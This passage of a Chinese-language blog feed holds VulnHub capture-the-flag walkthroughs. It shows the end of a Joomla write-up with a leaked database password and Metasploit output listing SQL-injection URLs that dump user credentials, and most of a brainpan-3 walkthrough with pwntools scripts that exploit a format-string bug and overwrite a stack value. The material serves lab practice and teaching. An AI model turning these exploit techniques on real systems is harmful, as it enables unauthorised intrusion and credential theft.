class="string">&#x27;/var/www/logs&#x27;</span>;</span><br><span class="line">var <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/tmp&#x27;</span>;</span><br><span class="line">/* Session Setting */</span><br><span class="line">var <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">var <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>账号密码为:root/yUtJklM97W</p>
<p>具体参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kZGQ0MWI4NDFjMzY=">phpmyadmin getshell<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>使用msf中的auxiliary/scanner/http/joomla_plugins模块扫描</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">     .~+P``````-o+:.                                      -o+:.</span><br><span class="line">.+oooyysyyssyyssyddh++os-`````                        ```````````````          `</span><br><span class="line">+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o</span><br><span class="line">++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy</span><br><span class="line">--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///</span><br><span class="line">                                `...............`              `...-/////...`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                  .::::::::::-.                     .::::::-</span><br><span class="line">                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo</span><br><span class="line">                                 :Nm-/NMMMMMMMMMMMMM$<span class="variable">$NMMMMm</span>&amp;&amp;MMMMMMMMMMMMMMy</span><br><span class="line">                                 .sm/`-yMMMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMMMh`</span><br><span class="line">                                  -Nd`  :MMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMMh`</span><br><span class="line">                                   -Nh` .yMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMm/</span><br><span class="line">    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMm/</span><br><span class="line">      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMd</span><br><span class="line">    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/</span><br><span class="line">    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:</span><br><span class="line">          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+</span><br><span class="line">          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::</span><br><span class="line">          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||</span><br><span class="line">........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........</span><br><span class="line">================================================================================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">=====================| Session one died of dysentery. |=========================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">================================================================================</span><br><span class="line"></span><br><span class="line">                     Press ENTER to size up the situation</span><br><span class="line"></span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It<span class="string">&#x27;s always cool in the lab %%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        Press SPACE BAR to continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.63-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use auxiliary/scanner/http/joomla_plugins</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; set RHOSTS 192.168.84.143</span></span><br><span class="line"><span class="string">RHOSTS =&gt; 192.168.84.143</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; set RPORT 666</span></span><br><span class="line"><span class="string">RPORT =&gt; 666</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; exploit </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Plugin: /administrator/ </span></span><br><span class="line"><span class="string">[+] Plugin: /administrator/index.php?option=com_djartgallery&amp;task=editItem&amp;cid[]=1&#x27;</span>+and+1=1+--+ </span><br><span class="line">[+] Plugin: /administrator/index.php?option=com_searchlog&amp;act=<span class="built_in">log</span> </span><br><span class="line">[+] Plugin: /components/com_abc/ </span><br><span class="line">[+] Page: /index.php?option=com_abc</span><br><span class="line">[+] Plugin: /components/com_amblog/ </span><br><span class="line">[+] Page: /index.php?option=com_amblog</span><br><span class="line">[+] Plugin: /components/com_banners/ </span><br><span class="line">[+] Page: /index.php?option=com_banners</span><br><span class="line">[+] Plugin: /components/com_contact/ </span><br><span class="line">[+] Page: /index.php?option=com_contact</span><br><span class="line">[+] Plugin: /components/com_content/ </span><br><span class="line">[+] Page: /index.php?option=com_content</span><br><span class="line">[+] Plugin: /components/com_mailto/ </span><br><span class="line">[+] Plugin: /components/com_media/ </span><br><span class="line">[+] Plugin: /components/com_newsfeeds/ </span><br><span class="line">[+] Page: /index.php?option=com_newsfeeds</span><br><span class="line">[+] Plugin: /components/com_poll/ </span><br><span class="line">[+] Plugin: /components/com_search/ </span><br><span class="line">[+] Plugin: /components/com_user/ </span><br><span class="line">[+] Page: /index.php?option=com_user</span><br><span class="line">[+] Plugin: /components/com_user/controller.php </span><br><span class="line">[+] Plugin: /components/com_weblinks/ </span><br><span class="line">[+] Page: /index.php?option=com_weblinks</span><br><span class="line">[+] Plugin: /components/com_wrapper/ </span><br><span class="line">[+] Page: /index.php?option=com_wrapper</span><br><span class="line">[+] Plugin: /includes/joomla.php </span><br><span class="line">[+] Plugin: /index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[+] Vulnerability: Potential SQL Injection</span></span><br><span class="line"><span class="string">[+] Plugin: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1 UNION SELECT @@version </span></span><br><span class="line"><span class="string">[+] Page: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1 UNION SELECT @@version</span></span><br><span class="line"><span class="string">[+] Plugin: /index.php?option=com_newsfeeds&amp;view=categories&amp;feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users-- </span></span><br><span class="line"><span class="string">[+] Page: /index.php?option=com_newsfeeds&amp;view=categories&amp;feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos</span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/joomla/utilities/compat/php50x.php </span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/phpmailer/phpmailer.php </span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/phpxmlrpc/xmlrpcs.php </span></span><br><span class="line"><span class="string">[+] Plugin: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/ </span></span><br><span class="line"><span class="string">[+] Plugin: /plugins/editors/xstandard/attachmentlibrary.php </span></span><br><span class="line"><span class="string">[+] Plugin: /templates/ja_purity/ </span></span><br><span class="line"><span class="string">[*] Scanned 1 of 1 hosts (100% complete)</span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br></pre></td></tr></table></figure>

<p>发现存在注入漏洞,接下来sqlmap一波就行。</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-3]</title>
    <url>/2020/02/03/brainpan-3/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：3<br>发行日期：2015年7月27日</p>
<h3 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h3><ul>
<li>万劫不复地狱难度</li>
</ul>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlw">https://download.vulnhub.com/brainpan/brainpan3.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan3.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>免责声明<br>使用此虚拟机，即表示您同意，我对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。TL; DR：如果发生坏事，这不是我的错。</p>
<p>设定<br>Brainpan 3经过测试，发现可与VMware Player，VMware Fusion和Virtual Box一起使用。<br>检查并确保Brainpan_III.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：170e0d8b26ab721587537fcde69087a0SHA1：ed9ae53c556a1ce6988b3a54621dd6469c8b8aa5</span><br></pre></td></tr></table></figure>

<p>将Brainpan_III.ova导入到您首选的管理程序中，并根据需要配置网络设置。它会通过DHCP获得IP地址，但是建议您在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。</p>
<p>目标<br>root机器并获取flag。</p>
<ul>
<li>barrebas : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9iYXJyZWJhcw==">https://twitter.com/barrebas<i class="fa fa-external-link-alt"></i></span></li>
<li>Swappage : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9Td2FwcGFnZQ==">https://twitter.com/Swappage<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.117</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.117 --system-dns</span></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">1337/tcp open   waste?</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure>

<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>找到端口1337后，可以开始使用Brainpan3。可以设置一个小的脚本来轻松地与服务器交互：</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>即使文字说</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>最初的想法是，“太酷了，四位数，Go Go Gadget Brute Force！”。原来，不是在撒谎。经过3次尝试，这个数字确实改变了。</p>
<p>一个登录提示，可以尝试使输入缓冲区溢出，以尝试产生堆栈溢出。这种方法的问题在于，溢出后没有二进制文件可以进行分析。最有意义的漏洞利用是格式字符串。来一些格式字符串试试！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE: $ %x.%x.%x.%x.%x.</span><br><span class="line">ERROR <span class="comment">#4: WHAT IS THIS, AMATEUR HOUR?</span></span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>Herm ..是否在％x上进行过滤？尝试其他格式的字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %p.%p.%p.%p.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbf8a439c.(nil).0x22dd.0xbf8a439c.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>现在知道此输入容易受到恶意格式字符串的攻击。由于正在寻找一个4位数的访问代码，因此可以假定它可能存储在堆栈中。尝试使用％d。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %d.%d.%d.%d.%d.%d.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1081457764.0.4625.-1081457764.0.10.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>啊!这里的第三个数是什么：4625,尝试一下访问代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ 4625</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-7034</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>进来了！在继续进行之前，修改脚本以自动跳过访问代码：</p>
<ul>
<li>发送%d.%d.%d.%d.%d.%d</li>
<li>提取第三个元素（访问代码）</li>
<li>提交访问代码以进行登录</li>
</ul>
<p>从这里开始，将继续向脚本中添加代码片段,结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8695</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4373</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>现在已经登录，可以做更多的探索。看，已经使用Command 4获得了一个Shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 4</span><br><span class="line">SELECTED: 4</span><br><span class="line">reynard@brainpan3 $ $ ls</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 <span class="built_in">let</span></span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down</span><br></pre></td></tr></table></figure>

<p>当然，可以尝试溢出此shell脚本/二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reynard@brainpan3 $ $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** stack smashing detected ***: ./shell terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<p>经过更多尝试使用典型的recon命令whoami，uname -a等的探索，可以得出结论，该shell是无用的。尝试其他选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line">REPORT MODE IS DISABLED IN THIS BUILD</span><br><span class="line"></span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<p>看起来report模式当前处于禁用状态。可以尝试打开report，但是要怎么打开？</p>
<p>打开REPOSITORY，在端口8080上启用Web服务，该端口还具有/repo目录，其中包含在此步骤中使用的二进制文件：</p>
<p><img src="http://ctfhacker.com/assets/images/repo-directory.png"></p>
<p>花一些时间了解这些二进制文件是如何工作的，但最终没有任何有用的东西。这里是否存在其他漏洞。</p>
<p>尚未查看的最后一个功能是“Update Session Name”功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ fuckfuckfuckfuck</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: fuckfuckfuckfuck</span><br></pre></td></tr></table></figure>

<p>有趣的是，可以从访问代码中使用会话名称复制字符串格式漏洞吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %p.%p.%p.%p.%p.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: 0xbfcfddcc.0x104.0x252e7025.0x70252e70.0x2e70252e.</span><br></pre></td></tr></table></figure>

<p>可以。丢弃堆栈中的很大一部分，看看有什么。发送70个％x。请注意，仅在末尾添加句点，以便更轻松地拆分结果字符串。这样可以使各个格式字符串与其输出之间的关联更加容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: bfcfddcc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b76d9c20.bfcfdf1c.0.b76d9000.b76d9ac0.b76da898.b752d940.b759f0b5.b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.</span><br><span class="line">\xff \x9cm\xb7\x1cϿ</span><br></pre></td></tr></table></figure>

<p>在这里，正在研究很多重复的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; unhex(<span class="string">&#x27;252e7825&#x27;</span>)[::-1]</span><br><span class="line"><span class="string">&#x27;%x.%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>看起来那些重复的字符是格式字符串缓冲区。此格式字符串中有一个有趣的段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python</span></span><br><span class="line">Python 2.7.17 (default, Jan 19 2020, 19:54:54) </span><br><span class="line">[GCC 9.2.1 20200110] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.&#x27;</span>.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">...   unhex(item)</span><br><span class="line">... </span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;N&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x98\xa0&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x90\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Y，N，Y看起来非常类似于命令菜单中显示的对话框的Y，N，Y。可以尝试在Y，N，Y上写一个缓冲区，使其变为Y，Y，Y吗？抓住4e在格式字符串中的哪个位置，以便知道有多少溢出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本，注意，report现在出现了[Y]！nice！。看看如何处理report。</p>
